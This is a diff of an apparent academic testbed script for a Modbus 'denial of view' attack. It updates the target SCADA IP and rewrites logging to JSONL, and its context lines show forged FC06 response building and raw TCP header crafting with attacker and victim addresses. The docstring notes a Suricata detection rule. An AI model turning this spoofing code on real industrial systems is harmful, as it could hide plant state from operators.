@@ -20,7 +20,7 @@ Detection: Suricata catches the forged holding register writes
 (SID 9000001).
 
 Run this ON THE ATTACKER HOST:
-    python3 attacks/denial_of_view.py --scada-ip 10.0.0.10 --plc-ip 10.0.0.1
+    python3 attacks/denial_of_view.py --scada-ip 10.0.0.20 --plc-ip 10.0.0.1
 
 ACADEMIC USE ONLY — isolated testbed, no production systems.
 """
@@ -41,16 +41,11 @@ MODBUS_PORT = 502
 
 
 def log_event(log_path: Path, event: dict):
-    """Append one event to the shared JSON log store."""
+    """Append one event to the shared JSON log store (JSONL format)."""
     event["timestamp"] = datetime.now(timezone.utc).isoformat()
-    events = []
-    if log_path.exists():
-        try:
-            events = json.loads(log_path.read_text())
-        except json.JSONDecodeError:
-            events = []
-    events.append(event)
-    log_path.write_text(json.dumps(events, indent=2))
+    log_path.parent.mkdir(parents=True, exist_ok=True)
+    with open(log_path, "a", encoding="utf-8") as f:
+        f.write(json.dumps(event) + "\n")
 
 
 def build_forged_fc06_response(transaction_id: int, unit_id: int,
@@ -108,7 +103,7 @@ def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int,
         (data_offset << 4) | flags, window, checksum, urgent)
     # Pseudo-header for checksum
     src_bytes = socket.inet_aton("10.0.0.66")  # attacker IP
-    dst_bytes = socket.inet_aton("10.0.0.10")  # SCADA IP
+    dst_bytes = socket.inet_aton("10.0.0.20")  # SCADA IP
     pseudo = struct.pack(">4s4sBBH", src_bytes, dst_bytes,
                           0, 6, len(header) + len(payload))
     s = sum(struct.unpack("!%dH" % ((len(pseudo) + len(header) + len(payload) + 1) // 2),
